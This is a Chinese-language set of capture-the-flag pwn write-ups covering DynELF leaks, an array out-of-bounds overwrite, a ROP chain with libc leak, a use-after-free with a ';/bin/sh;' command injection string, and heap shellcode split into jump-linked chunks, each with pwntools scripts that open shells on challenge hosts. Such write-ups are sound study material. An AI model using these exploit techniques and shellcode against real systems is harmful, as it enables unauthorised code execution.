DynELF

p = process('./xxx')
def leak(address):
  #各种预处理
  payload = "xxxxxxxx" + address + "xxxxxxxx"
  p.send(payload)
  #各种处理
  data = p.recv(4)
  log.debug("%#x => %s" % (address, (data or '').encode('hex')))
  return data
d = DynELF(leak, elf=ELF("./xxx"))      #初始化DynELF模块 
systemAddress = d.lookup('system', 'libc')  #在libc文件中搜索system函数的地址

使用条件

  • 目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内
  • 目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息

EXP

下面来说说咱们这个程序：首先程序存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件，但这个程序是64位，故：

  • 64位linux下的函数需要通过rop链将参数传入寄存器，而不是依靠栈布局
  • puts函数与write函数不同，不能指定输出字符串的长度
    在x64环境下，函数的参数是通过寄存器传递的，rdi对应第一个参数，rsi对应第二个参数，rdx对应第三个参数，往往凑不出类似“pop rdi; ret”、“pop rsi; ret”、“pop rdx; ret”等3个传参的gadget。此时，可以考虑使用__libc_csu_init函数的通用gadget，具体原理请参见文章。

stack2

change number没有对边界进行检查，可以实现数组越界读写，并且有后门函数，所以直接将EIP覆盖为后门函数的地址。需要注意：

  • EIP和v13之间的偏移并不是0x70+4，需要用gdb自己调试，结果是0x84
  • 远程连接后并没有/bin/bash指令，所以我们手动构造system('sh')

在main函数开始和retn分别下断点，得到一开始EBP的值为0xffffcef8，运行到retn栈顶的地址为0xffffcf0c，所以偏移为0xffffcf0c-(0xffffcef8-0x70)=0x84。

from pwn import *
# context.log_level = 'debug'

process_name = './s2'
#p = process(process_name)
p = remote('111.198.29.45','38958')

hackhere = [0x9b, 0x85, 0x04, 0x08]  #0x0804859B
system = [0x50, 0x84, 0x04, 0x08]    #0x8048450
sh_addr = [0x87, 0x89, 0x04, 0x08]    #0x8048987
write_offset = 0x84

def change_number(offset, value):
    p.sendlineafter('5. exit', '3')
    p.sendlineafter('which number to change:', str(offset))
    p.sendlineafter('new number:', str(value))

p.sendlineafter('How many numbers you have:', '1')
p.sendlineafter('Give me your numbers', '1')

for i in range(4):
    change_number(write_offset+i, system[i])

write_offset+= 0x8
for i in range(4):
    change_number(write_offset+i, sh_addr[i])

p.sendlineafter('5. exit', '5')
p.interactive()

welpwn

分析

该程序buf会复制到s2，由s2可实现栈溢出，但复制过程中遇到\x00会截断，这是64位程序，地址一般都是有\x00的，也就是说payload只能覆盖到eip，后续地址会被截断，但payload是完整保存在buf中的。

我们调试一下，发现buf和s2是物理相邻的（输入’a’x12+’b’x12+’cccc’）：

我们可以把eip覆盖为`0x000000000040089c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret`。这样会从栈中pop出0x20个字节，跳过buf的开头，继续执行后续的代码：
## EXP

#context.log_level = 'debug'

#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

payload = 'a'*0x18
payload+= p64(pop4)
payload+= p64(pop_rdi)+p64(elf.got['write'])
payload+= p64(elf.plt['puts'])
payload+= p64(0x4007CD)

p.recvuntil('RCTF')
p.send(payload)

p.info('libc_base: '+hex(libc_base))
system = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')

payload+= p64(pop_rdi)+p64(bin_sh)
payload+= p64(system)

p.send(payload)

Time formatter

输入/bin/date -d @1 +'';/bin/sh;''会 get shell，也就是说我们要让 ptr 变成';/bin/sh;'。ptr *是我们输入的 time format，但由于有格式限制，我们不能输入;和'。我们发现 *ptr 和 value 指向的是存储着我们输入的 time_format 和 time_zone 字符串的堆（可以康康strdup函数），并且 exit 功能里面会 free 这两个堆块，但没有置为NULL，存在UAF漏洞。

所以思路是先输入符合要求的 time_format ，之后用 exit 功能 free 掉 ptr 但不退出。之后输入 time_zone 的时候会申请前面 ptr 的堆块，这样 value 和 ptr 指向的是相同的堆块，就可以向 ptr 写入';/bin/sh;'。

from pwn import *

p = process('./time_formatter')
#p = remote('111.198.29.45','44913')

p.recvuntil('> ')
p.sendline('1')
p.recvuntil('Format: ')
p.sendline('a'*11)
p.recvuntil('> ')
p.sendline('5')
p.sendline('N')
p.recvuntil('> ')
p.sendline('3')
p.recvuntil('zone: ')
p.sendline('\';/bin/sh;\'')
p.recvuntil('> ')
p.sendline('4')
p.interactive()

note-service2

程序只有两个功能：add 和 delete 。其中 add 函数中最大只能申请 malloc(8)，得到 0x20 的 chunk；delete 函数中存在 UAF。我一开始只看到这一个漏洞，发现无法利用，看完 wp 涨了一波姿势。还有个漏洞是 add 函数中输入 index 的时候没有限制，所以我们可以任意地址写，然后程序本身没有开 NX 保护，意味着我们可以写 shellcode。但每次只能写 7 字节的 shellcode，于是可以申请多个堆，每个堆写完执行 jmp short xx，跳到下一个指令中。xx是jmp short 到下一个指令地址的偏移 1+8+8+8 = 0x19。

所以思路是先申请一个堆块写入 /bin/sh，再把 shellcode 写入 free_got 中 ，最后释放含有 /bin/sh 的堆块。

shellcode

相当于执行 execve("/bin/sh",0,0)，传参的时候会把第一个参数传个 rdx，也就是堆块里的 /bin/sh 。

xor rsi,rsi;
mov rax,0x3b;
xor rdx,rdx;
syscall;

from pwn import *
context(arch = 'amd64',os='linux')
#p = process('./note')
p = remote('111.198.29.45','37156')
elf = ELF('./note')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def cmd(ch):
    p.sendlineafter('>> ',str(ch))

def add(idx,size,con):
    cmd(1)
    p.sendlineafter('index:',str(idx))
    p.sendlineafter('size:',str(size))
    p.sendafter('content:',con)

def delete(idx):
    cmd(4)
    p.sendlineafter('index:',str(idx))

def exp():
    idx=(elf.got['free']-0x2020A0)/8
    add(0,8,'/bin/sh')
    add(idx,8,'\x48\x31\xf6\x90\x90\xeb\x19')
    add(1,8,'\xb8\x3b\x00\x00\x00\xeb\x19')
    add(2,8,'\x48\x31\xd2\x90\x90\xeb\x19')
    add(3,8,'\x0f\x05\x90\x90\x90\x90\x90')
    delete(0)


if __name__ == '__main__':
    exp()
    p.interactive()
